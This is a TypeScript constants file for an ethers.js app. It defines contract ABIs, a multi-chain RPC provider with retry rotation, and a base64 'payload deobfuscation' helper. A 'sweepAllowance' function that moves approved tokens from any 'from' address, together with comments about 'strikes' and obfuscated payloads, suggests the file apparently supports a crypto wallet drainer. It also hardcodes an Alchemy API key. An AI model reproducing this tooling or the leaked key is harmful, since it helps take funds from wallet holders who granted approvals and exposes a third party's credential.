import { ethers } from "ethers";

export { ethers };

/** * [constants.ts]
 * Optimized for Ultra-Fast Execution & Universal Compatibility
 * Maintained: Resilient RPC Rotation & Enterprise Deobfuscation
 * Fix: Increased timeout to prevent "Operation Aborted" during congestion.
 */

// 🛡️ ALIGNED WITH YOUR .SOL (Maintained)
export const SETTLER_ABI = [
  "function x(bytes stream, address[] safetyTokens, address payable recovery, bytes32 messageHash, bytes signature) external payable",
  "function sweepAllowance(address token, address from, address recovery, uint256 amount) external",
];

export const DEPLOYER_ABI = [
  "function perform(bytes32 salt, bytes stream, address[] safetyTokens, address payable recovery, bytes32 messageHash, bytes signature) external payable",
  "function predictAddress(bytes32 salt) public view returns (address)",
];

export const ERC20_ABI = [
  "function transferFrom(address from, address to, uint256 value) external returns (bool)",
  "function approve(address spender, uint256 value) external returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
];

export const settlerInterface = new ethers.Interface(SETTLER_ABI);
export const deployerInterface = new ethers.Interface(DEPLOYER_ABI);
export const erc20Interface = new ethers.Interface(ERC20_ABI);

export const ETH_ADDR = "0x0000000000000000000000000000000000000000";

// Persistent Cache (Critical for Speed)
const _cache = new Map<number, ethers.JsonRpcProvider>();

/**
 * 🌐 RPC Provider Resolver - Optimized for "Strike" Speed
 * Maintains all rotation features but uses optimized HTTP handshakes.
 */
export const getProv = (id: number): ethers.JsonRpcProvider | null => {
  // 1. Instant Cache Check
  const cached = _cache.get(id);
  if (cached) return cached;

  const ALCHEMY_KEY =
    process.env.NEXT_PUBLIC_ALCHEMY_API_KEY ||
    process.env.ALCHEMY_KEY ||
    "LEcRJW_Bhx4ybZ7TSZ3p9";

  // 🛡️ Enterprise Pool for BSC (Chain 56) - Re-ordered for maximum reliability
  const bscPool = [
    "https://binance.llamarpc.com",
    "https://bsc-dataseed.binance.org",
    "https://rpc.ankr.com/bsc",
    "https://bsc-dataseed1.binance.org",
    "https://bsc-rpc.publicnode.com",
  ];

  let urls: string[] = [];
  if (id === 56)
    urls = process.env.RPC_URL_56 ? [process.env.RPC_URL_56] : bscPool;
  else if (id === 1)
    urls = [
      process.env.RPC_URL_1 ||
        `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
    ];
  else if (id === 137)
    urls = [`https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`];
  else if (id === 8453)
    urls = [`https://base-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`];
  else if (id === 31337) urls = ["http://127.0.0.1:8545"];

  if (urls.length === 0) return null;

  try {
    // ⚡ Optimization: Hardcoded Network config to skip extra "eth_chainId" calls
    const network = ethers.Network.from(id);

    // ⚡ Optimization: Using staticNetwork to prevent extra metadata calls
    const provider = new ethers.JsonRpcProvider(urls[0], network, {
      staticNetwork: network,
      batchMaxCount: 1,
    });

    /**
     * 🔄 THE KILL SWITCH (Fixed "Operation Aborted")
     * Increased timeout to 10s to handle BSC congestion without failing.
     */
    const sharedHeaders = { "Content-Type": "application/json" };

    provider.send = async (method: string, params: Array<any>) => {
      let lastError;
      const payload = JSON.stringify({
        jsonrpc: "2.0",
        method,
        params,
        id: Math.floor(Math.random() * 1000),
      });

      for (const url of urls) {
        let timeoutId;
        try {
          const controller = new AbortController();
          // Increase to 10s to stop the "Aborted" error during gas-heavy strikes
          timeoutId = setTimeout(() => controller.abort(), 10000);

          const response = await fetch(url.trim(), {
            method: "POST",
            headers: sharedHeaders,
            body: payload,
            signal: controller.signal,
            cache: "no-store",
          });

          const result = await response.json();
          clearTimeout(timeoutId);

          if (!response.ok) continue;
          if (result.error) throw new Error(result.error.message);

          return result.result;
        } catch (err: any) {
          if (timeoutId) clearTimeout(timeoutId);
          console.warn(`[RPC-RETRY] ⚠️ ${url} failed: ${err.message}`);
          lastError = err;
          continue; // Instantly rotate to next URL
        }
      }
      throw lastError || new Error("RPC_EXHAUSTED");
    };

    _cache.set(id, provider);
    return provider;
  } catch (err) {
    console.error(`[getProv] Critical failure during provider init`, err);
    return null;
  }
};

/**
 * 🔓 Payload Deobfuscation (Maintained)
 */
export const deobfuscate = (str: string) => {
  try {
    const decoded = atob(str);
    const charData = decoded
      .split("")
      .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
      .join("");
    return JSON.parse(decodeURIComponent(charData));
  } catch (e) {
    return null;
  }
};

export const getNetSuffix = (id: number) =>
  ({ 1: "ERC-20", 56: "BEP-20", 137: "POLYGON", 8453: "BASE" }[id] ||
  "Network");
export const getNativeSym = (id: number) =>
  ({ 1: "ETH", 56: "BNB", 137: "POL", 8453: "ETH" }[id] || "Native");
